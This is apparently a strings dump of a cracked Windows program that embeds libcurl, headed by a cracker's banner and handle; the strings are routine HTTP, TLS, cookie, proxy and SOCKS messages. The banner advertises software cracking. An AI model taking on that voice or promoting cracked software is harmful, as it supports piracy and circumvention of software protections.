#############
CRACKED BY kwsstas.westt#1312
#############
DONT DM FOR SUPPORT!!
#############
Galaxy < Suicide


Offset	Size	Type	String
0006dee0	14	A	SEC_E_UNTRUSTED_ROOT
0006def8	1d	A	SEC_E_WRONG_CREDENTIAL_HANDLE
0006df18	15	A	SEC_E_WRONG_PRINCIPAL
0006df30	1b	A	SEC_I_COMPLETE_AND_CONTINUE
0006df50	15	A	SEC_I_COMPLETE_NEEDED
0006df68	15	A	SEC_I_CONTEXT_EXPIRED
0006df80	15	A	SEC_I_CONTINUE_NEEDED
0006df98	1c	A	SEC_I_INCOMPLETE_CREDENTIALS
0006dfb8	11	A	SEC_I_LOCAL_LOGON
0006dfd0	14	A	SEC_I_NO_LSA_CONTEXT
0006dfe8	11	A	SEC_I_RENEGOTIATE
0006e000	16	A	SEC_I_SIGNATURE_NEEDED
0006e020	b8	A	SEC_E_ILLEGAL_MESSAGE (0x%08X) - This error usually occurs when a fatal SSL/TLS alert is received (e.g. handshake failed). More detail may be available in the Windows System event log.
0006e0e0	0b	A	%s (0x%08X)
0006e0f0	07	A	%s - %s
0006e0f8	28	A	easy handle already used in multi handle
0006e130	05	A	FLUSH
0006e138	06	A	RELOAD
0006e140	0b	A	Set-Cookie:
0006e180	44	A	6666666666666666\\\\\\\\\\\\\\\\0123456789abcdefghijklmnopqrstuvwxyz
0006e1c8	24	A	0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
0006e1f0	05	A	(nil)
0006e1f8	05	A	(nil)
0006e2b8	26	A	Connection #%ld to host %s left intact
0006e310	2c	A	Resolving timed out after %I64d milliseconds
0006e340	2d	A	Connection timed out after %I64d milliseconds
0006e370	53	A	Operation timed out after %I64d milliseconds with %I64d out of %I64d bytes received
0006e3d0	46	A	Operation timed out after %I64d milliseconds with %I64d bytes received
0006e4f0	09	A	localhost
0006e558	09	A	__Secure-
0006e568	07	A	__Host-
0006e570	06	A	secure
0006e578	08	A	httponly
0006e58c	06	A	domain
0006e5c8	07	A	max-age
0006e5d0	07	A	expires
0006e5d8	0a	A	#HttpOnly_
0006e5f0	05	A	FALSE
0006e5f8	08	A	Replaced
0006e604	05	A	Added
0006e650	07	A	unknown
0006e678	09	A	%s.%s.tmp
0006e76c	05	A	proxy
0006e780	18	A	Could not resolve %s: %s
0006e900	40	A	ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
0006ea50	10	A	0123456789ABCDEF
0006ea70	09	A	image/gif
0006ea88	0a	A	image/jpeg
0006ea94	05	A	.jpeg
0006eaa8	09	A	image/png
0006eac0	0d	A	image/svg+xml
0006ead8	0a	A	text/plain
0006eaf0	09	A	text/html
0006eafc	05	A	.html
0006eb10	0f	A	application/pdf
0006eb28	0f	A	application/xml
0006eb38	06	A	binary
0006eb50	06	A	base64
0006eb58	10	A	quoted-printable
0006eb70	0c	A	Content-Type
0006eb98	1e	A	Can't add itself as a subpart!
0006ebb8	0b	A	; boundary=
0006ebc8	14	A	Content-Type: %s%s%s
0006ebe0	0f	A	multipart/mixed
0006ebf0	18	A	application/octet-stream
0006ec10	13	A	Content-Disposition
0006ec28	0a	A	multipart/
0006ec38	0a	A	attachment
0006ec48	0c	A	; filename="
0006ec58	08	A	; name="
0006ec68	23	A	Content-Disposition: %s%s%s%s%s%s%s
0006ec90	19	A	Content-Transfer-Encoding
0006ecb0	1d	A	Content-Transfer-Encoding: %s
0006ecd0	13	A	multipart/form-data
0006ece8	09	A	form-data
0006ed00	15	A	----------------%ld%s
0006ee10	05	A	multi
0006ee18	3a	A	Unrecognized parameter value passed via CURLOPT_SSLVERSION
0006ee58	35	A	CURL_SSLVERSION_MAX incompatible with CURL_SSLVERSION
0006ee98	1a	A	-----BEGIN PUBLIC KEY-----
0006eeb9	18	A	-----END PUBLIC KEY-----
0006eed8	08	A	sha256//
0006ef08	09	A	;sha256//
0006ef20	08	A	%s%s%s%s
0006ef30	10	A	CURL_SSL_BACKEND
0006f088	0d	A	<no protocol>
0006f110	0d	A	can multiplex
0006f120	08	A	serially
0006f320	32	A	Protocol "%s" not supported or disabled in libcurl
0006f370	07	A	%s://%s
0006f380	06	A	%I64d-
0006f390	06	A	_proxy
0006f398	0a	A	http_proxy
0006f3a8	09	A	all_proxy
0006f3b8	09	A	ALL_PROXY
0006f3ec	05	A	https
0006f3f8	07	A	socks5h
0006f400	06	A	socks5
0006f408	07	A	socks4a
0006f410	06	A	socks4
0006f418	05	A	socks
0006f428	21	A	Unsupported proxy scheme for '%s'
0006f450	20	A	Unsupported proxy syntax in '%s'
0006f480	49	A	Unsupported proxy '%s', libcurl is built without the HTTPS-proxy support.
0006f4d0	0f	A	memory shortage
0006f4e0	08	A	no_proxy
0006f4f0	08	A	NO_PROXY
0006f540	09	A	anonymous
0006f550	0f	A	ftp@example.com
0006f5f8	06	A	%s%s%s
0006f638	1f	A	Unix socket path too long: '%s'
0006f658	1a	A	Couldn't resolve host '%s'
0006f678	1b	A	Couldn't resolve proxy '%s'
0006f7f0	10	A	Send failure: %s
0006f808	10	A	Recv failure: %s
0006f820	32	A	Write callback asked for PAUSE when not supported!
0006f858	20	A	Failed writing body (%zu != %zu)
0006f880	15	A	Failed writing header
0006f89c	05	A	host!
0006f900	1f	A	Couldn't bind to interface '%s'
0006f988	15	A	Couldn't bind to '%s'
0006f9a0	26	A	getsockname() failed with errno %d: %s
0006fa10	1d	A	bind failed with errno %d: %s
0006fa30	26	A	getpeername() failed with errno %d: %s
0006fa58	2a	A	ssrem inet_ntop() failed with errno %d: %s
0006fa88	2a	A	ssloc inet_ntop() failed with errno %d: %s
0006fab8	1e	A	unknown proxytype option given
0006fad8	13	A	Connection time-out
0006fb58	24	A	Failed to connect to %s port %ld: %s
0006fba0	2c	A	sa_addr inet_ntop() failed with errno %d: %s
0006fc0c	06	A	Digest
0006fc1c	06	A	Proxy-
0006fc48	0c	A	iphlpapi.dll
0006fc58	0e	A	if_nametoindex
0006fc68	08	A	kernel32
0006fc78	0e	A	LoadLibraryExA
0006fc90	0f	A	AddDllDirectory
0006fd40	08	A	identity
0006fd50	4d	A	Unrecognized content encoding type. libcurl understands %s content encodings.
0006fda0	07	A	chunked
0006ff98	05	A	%s:%d
0006ffa0	07	A	CONNECT
0006ffb0	09	A	%s%s%s:%d
0006ffd8	10	A	Proxy-Connection
00070010	0a	A	User-Agent
00070034	08	A	%s%s%s%s
00070040	1f	A	Failed sending CONNECT to proxy
00070060	24	A	Proxy CONNECT aborted due to timeout
00070088	1b	A	CONNECT response too large!
000700d0	15	A	Proxy CONNECT aborted
00070148	11	A	WWW-Authenticate:
00070160	13	A	Proxy-authenticate:
00070178	0f	A	Content-Length:
000701bc	05	A	close
000701c8	0b	A	Connection:
000701d8	12	A	Transfer-Encoding:
00070248	11	A	Proxy-Connection:
00070260	0c	A	HTTP/1.%d %d
00070290	2e	A	Received HTTP code %d from proxy after CONNECT
00070328	2c	A	Unable to allocate trailing headers buffer !
00070358	2e	A	operation aborted by trailing headers callback
000703b0	1d	A	operation aborted by callback
000703d0	31	A	Read callback asked for PAUSE when not supported!
00070408	22	A	read function returned funny value
00070430	05	A	%zx%s
000704a8	1c	A	Cannot rewind mime/post data
000704c8	1f	A	seek callback returned error %d
00070508	20	A	ioctl callback returned error %d
00070530	25	A	necessary data rewind wasn't possible
00070610	29	A	The entire document is already downloaded
00070640	3f	A	HTTP server doesn't seem to support byte ranges. Cannot resume.
000706a0	29	A	Failed reading the chunked-encoded stream
000706d0	16	A	%s in chunked-encoding
000707b0	1f	A	Failed to alloc scratch buffer!
000707f8	1a	A	select/poll returned error
00070838	32	A	transfer closed with %I64d bytes remaining to read
00070870	34	A	transfer closed with outstanding read data remaining
000708a8	0b	A	No URL set!
000708b8	20	A	Maximum (%ld) redirects followed
00070978	30	A	Connection died, tried %d times before giving up
00070a10	16	A	Shuffling %i addresses
00070a50	0b	A	%255[^:]:%d
00070cc0	05	A	HTTPS
00070cc8	22	A	HTTP/3 requested for non-HTTPS URL
00070cec	05	A	%s:%s
00070dc8	19	A	Forcing HTTP/1.1 for NTLM
00070de8	24	A	The requested URL returned error: %d
00070e10	09	A	Negotiate
00070e28	13	A	Proxy-authorization
00070e40	0d	A	Authorization
00070e50	05	A	Basic
00070e58	0e	A	Authorization:
00070e68	06	A	Bearer
00070e70	05	A	Proxy
00070e78	06	A	Server
00070f28	17	A	Empty reply from server
00070f40	06	A	Expect
00070f48	0c	A	100-continue
00070f58	07	A	Expect:
00070f80	30	A	Malformatted trailing header ! Skipping trailer.
00070fb4	05	A	Host:
00070fc0	0d	A	Content-Type:
00070fd0	07	A	Cookie:
00070fe0	11	A	Invalid TIMEVALUE
00070ff8	11	A	If-Modified-Since
00071010	13	A	If-Unmodified-Since
00071028	0d	A	Last-Modified
00071070	07	A	OPTIONS
00071078	05	A	%s?%s
00071080	07	A	Referer
00071098	06	A	Cookie
000710a0	0f	A	Accept-Encoding
000710c8	11	A	Transfer-Encoding
000710e0	2a	A	Chunky upload is not supported by HTTP 1.0
00071168	06	A	;type=
00071170	08	A	;type=%c
0007117c	06	A	Accept
00071198	15	A	Could not seek stream
000711b0	2a	A	Could only read %I64d bytes from the input
000711e0	20	A	File already completely uploaded
00071204	05	A	Range
00071228	0d	A	Content-Range
000712b0	0e	A	ftp://%s:%s@%s
000712d4	18	A	%s%s%s%s%s%s%s%s%s%s%s%s
000712f0	08	A	Cookie: 
00071300	07	A	%s%s=%s
00071308	0e	A	Content-Length
00071330	1a	A	Failed sending PUT request
00071368	1b	A	Failed sending POST request
000713d0	20	A	Failed sending HTTP POST request
000713f8	1b	A	Failed sending HTTP request
00071450	05	A	HTTP/
00071458	05	A	RTSP/
00071460	26	A	Rejected %zu bytes header (max is %d)!
00071488	26	A	Failed to alloc memory for big header!
000714b0	24	A	The requested URL returned error: %s
00071638	12	A	 HTTP/%1d.%1d%c%3d
00071650	0f	A	 HTTP/%1[23] %d
000716b0	09	A	 HTTP %3d
000716c0	24	A	Unsupported HTTP version in response
000716e8	12	A	 RTSP/%1d.%1d%c%3d
00071750	1d	A	Invalid Content-Length: value
00071770	0a	A	keep-alive
00071800	11	A	Content-Encoding:
00071818	0c	A	Retry-After:
00071828	0e	A	Content-Range:
00071838	0e	A	Last-Modified:
00071848	0f	A	Persistent-Auth
00071858	05	A	false
00071860	2f	A	Negotiate: noauthpersist -> %d, header part: %s
00071890	09	A	Location:
000718a0	08	A	--:--:--
000718b0	16	A	%2I64d:%02I64d:%02I64d
000718c8	10	A	%3I64dd %02I64dh
000718e0	07	A	%7I64dd
000718e8	06	A	%5I64d
000718f0	07	A	%4I64dk
000718f8	0e	A	%2I64d.%0I64dM
00071908	07	A	%4I64dM
00071910	0e	A	%2I64d.%0I64dG
00071920	07	A	%4I64dG
00071928	07	A	%4I64dT
00071930	07	A	%4I64dP
00071a19	33	A	%3I64d %s  %3I64d %s  %3I64d %s  %s  %s %s %s %s %s
00071a50	10	A	Callback aborted
00071a6f	4d	A	@Operation too slow. Less than %ld bytes/sec transferred the last %ld seconds
00071bb8	2a	A	Failed to resolve "%s" for SOCKS4 connect.
00071c10	1a	A	SOCKS4: too long host name
00071c30	26	A	Failed to send SOCKS4 connect request.
00071c58	30	A	SOCKS4: Failed receiving connect request ack: %s
00071c90	34	A	SOCKS4 reply has wrong version, version should be 0.
00071cf0	55	A	Can't complete SOCKS4 connection to %d.%d.%d.%d:%d. (%d), request rejected or failed.
00071d50	87	A	Can't complete SOCKS4 connection to %d.%d.%d.%d:%d. (%d), request rejected because SOCKS server cannot connect to identd on the client.
00071de0	8b	A	Can't complete SOCKS4 connection to %d.%d.%d.%d:%d. (%d), request rejected because the client program and identd report different user-ids.
00071e70	42	A	Can't complete SOCKS4 connection to %d.%d.%d.%d:%d. (%d), Unknown.
00071f88	26	A	Unable to send initial SOCKS5 request.
00071fb0	2a	A	Unable to receive initial SOCKS5 response.
